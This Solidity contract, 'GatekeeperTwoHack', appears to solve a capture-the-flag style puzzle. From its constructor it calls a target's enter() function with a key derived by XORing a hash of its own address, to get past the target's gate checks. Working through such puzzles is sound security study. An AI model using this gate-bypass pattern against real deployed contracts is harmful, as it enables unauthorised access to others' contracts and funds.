// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoHack {
    error HackFailed(); // 0x2ca22774

    constructor(address gatekeeperTwoAddr) {
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^
            0xFFFFFFFFFFFFFFFF;

        bool success = IGatekeeperTwo(gatekeeperTwoAddr).enter(gateKey);

        if (success) {
            return;
        }

        revert HackFailed();
    }
}
